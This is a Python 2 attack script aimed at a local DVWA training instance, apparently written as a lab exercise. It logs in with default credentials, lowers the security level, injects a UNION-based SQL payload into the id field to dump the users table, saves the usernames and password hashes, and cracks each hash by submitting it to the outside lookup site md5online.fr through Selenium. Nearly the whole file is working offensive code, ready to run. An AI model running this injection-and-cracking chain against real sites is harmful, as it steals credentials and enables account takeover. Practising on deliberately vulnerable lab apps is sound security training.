#!/usr/bin/env python

import sys
import argparse
import mechanize
import time
from bs4 import BeautifulSoup
from selenium import webdriver
from itertools import izip

browser = mechanize.Browser()
browser.open("http://192.168.56.1:81/dvwa/")
browser.select_form(nr=0)
browser.set_value("admin", name="username", nr=0)
browser.set_value("password", name="password", nr=0)
browser.submit()
browser.open("http://192.168.56.1:81/dvwa/security.php") 
browser.select_form(nr=0)
level = browser.form.find_control("security")
level.value = ["medium"]
browser.submit()
browser.open("http://192.168.56.1:81/dvwa/vulnerabilities/sqli/")
browser.select_form(nr=0)
browser.set_value("-1 UNION select user,password from dvwa.users;#", name="id", nr=0)
page = browser.submit()
soup = BeautifulSoup(page, "lxml")
file_hashes = open('hashes','w')
file_user = open('users','w')
print "...\n...\n...\nDumping users and password hashes:\n...\n...\n... "
for pre in soup.find_all("pre"):
	print "User:",pre.text.split(":")[2].replace("Surname","")
	file_user.write(pre.text.split(":")[2].replace("Surname","") + '\n')
	print "Hash:",pre.text.split(":")[3]
	file_hashes.write(pre.text.split(":")[3] + '\n')
file_hashes.close()
file_user.close()
file_hashes = open('hashes','r')
file_password = open('passwords','w')
print "Processing hashes :  \n"
webpage = "http://md5online.fr"
for line in file_hashes:
	print line
	driver = webdriver.Firefox()
	driver.get(webpage)
	sbox = driver.find_element_by_name('md5')
	sbox.send_keys(line.rstrip('\n'))
	submit = driver.find_element_by_xpath("//input[@value='Decrypt']")
	submit.click()
	time.sleep(2)
	password = driver.find_element_by_tag_name('b')
	file_password.write(password.text + '\n')
	driver.close()
	time.sleep(2)
file_hashes.close()
file_password.close()
driver.quit()
print("\nUser List: ")
with open("users") as file1, open("passwords") as file2:
	for user,password in izip(file1,file2):
		user = user.strip()
		password = password.strip()
		print("User: {0} Password {1}".format(user,password))
